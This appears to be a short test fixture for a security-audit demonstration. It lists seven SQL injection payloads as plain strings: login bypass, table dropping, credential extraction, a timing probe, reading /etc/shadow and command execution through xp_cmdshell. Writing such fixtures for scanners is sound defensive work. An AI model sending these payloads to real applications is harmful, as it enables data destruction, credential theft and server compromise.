-- HARMLESS INERT FIXTURE — DO NOT RUN. Part of the aghub skill-audit demonstration.
-- Benign by design: no database is touched; these are payload-shaped strings only.

' OR '1'='1' --
'; DROP TABLE accounts; --
' UNION SELECT username, password FROM secrets --
'; WAITFOR DELAY '0:0:5' --
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --
' UNION SELECT LOAD_FILE('/etc/shadow') INTO OUTFILE '/tmp/out.txt' --
'; EXEC xp_cmdshell('whoami') --
